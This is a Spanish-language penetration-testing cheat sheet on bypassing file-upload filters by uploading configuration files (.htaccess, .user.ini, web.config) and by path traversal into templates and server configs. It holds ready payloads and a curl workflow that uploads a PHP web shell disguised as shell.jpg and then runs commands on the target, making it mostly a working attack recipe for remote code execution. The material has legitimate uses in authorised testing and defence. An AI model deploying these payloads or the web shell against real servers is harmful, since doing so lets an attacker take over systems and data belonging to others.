---
aliases: null
tags:
  - type/technique
  - vuln/file-upload
  - technique/execution
  - asset/web-app
kind: SubCheatSheet
linked:
  - '[[File Upload - Vulnerabilidades]]'
---
# File Upload - Bypass por Sobrescritura de Configuración

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Subir `.htaccess` con `AddType application/x-httpd-php .txt` → después `shell.txt` | `.txt` ejecuta como PHP en ese dir | Apache + `AllowOverride All`/`AllowOverride FileInfo`. |
| `.htaccess` con `SetHandler application/x-httpd-php` | TODO el dir ejecuta como PHP | Override más agresivo. |
| Subir `.user.ini` con `auto_prepend_file=shell.jpg` → subir `shell.jpg` con PHP | Cualquier `.php` del dir incluye `shell.jpg` antes | PHP-FPM + CGI mode. NO requiere AllowOverride. |
| `.user.ini` con `disable_functions=` | Restaura `system`/`exec` si estaban deshabilitadas | Hardening PHP relajado por upload. |
| `web.config` con handler XML para `.pdf → aspnet_isapi` | `.pdf` ejecuta como ASPX | IIS, dir con web.config writeable. |
| `web.config` con `<add accessPolicy="Read,Script" />` | Habilita ejecución de scripts en dir | IIS lockdown laxo. |
| Subir archivo zip → si app extrae → path traversal escribe `../../package.json` | Sobrescribe scripts de inicio (Node.js) | App extrae uploads zip sin sanitizar paths. |
| Path traversal en filename → `../templates/index.html` con SSTI payload | Persistent SSTI en template del framework | Flask/Django app que renderea templates. |
| Sobrescribir `web.xml`/`server.xml` en Tomcat (path traversal) | Reconfigurar context, agregar servlet malicioso | Tomcat upload dir → conf/. |
^fu-conf

### .htaccess (Apache)

```apache
# Opción 1 — ejecutar .txt como PHP
AddType application/x-httpd-php .txt

# Opción 2 — ejecutar TODO como PHP
SetHandler application/x-httpd-php

# Opción 3 — disable autoindex (oculta el upload dir)
Options -Indexes

# Opción 4 — ejecutar cualquier ext custom
<FilesMatch "\.shell$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### .user.ini (PHP-FPM, no requiere AllowOverride)

```ini
; Subir shell.jpg con payload PHP, después este .user.ini
auto_prepend_file = shell.jpg

; Visitar CUALQUIER .php legítimo del dir → ejecuta shell.jpg primero
; Más sigiloso que .htaccess
```

### web.config (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.pdf" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

### Workflow

```bash
# 1. Subir .htaccess (Apache)
echo 'AddType application/x-httpd-php .jpg' > .htaccess
curl -F 'file=@.htaccess' https://target/upload

# 2. Subir shell.jpg con PHP (passa whitelist .jpg)
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
curl -F 'file=@shell.jpg' https://target/upload

# 3. Ejecutar
curl 'https://target/uploads/shell.jpg?cmd=id'
```

### Cuándo NO funciona

- Apache con `AllowOverride None` → `.htaccess` ignorado.
- Uploads en S3 / fuera del webroot → configs son texto muerto.
- Filtro bloquea `.htaccess`/`.user.ini`/`web.config` por nombre → renombrar con tricks de OS (`.htaccess.` en Windows trim).

___

## Overview

Cuando ningún bypass de extensión funciona, **subir un archivo de config** redefine las reglas del directorio:

- **Apache `.htaccess`** — clásico, requiere `AllowOverride All`.
- **PHP `.user.ini`** — moderno, funciona en PHP-FPM/CGI sin AllowOverride.
- **IIS `web.config`** — equivalente Windows.
- **Path traversal a template/config files** — frameworks modernos (Flask/Django/Express).

Combo: subir config + subir payload "permitido" = RCE.

***
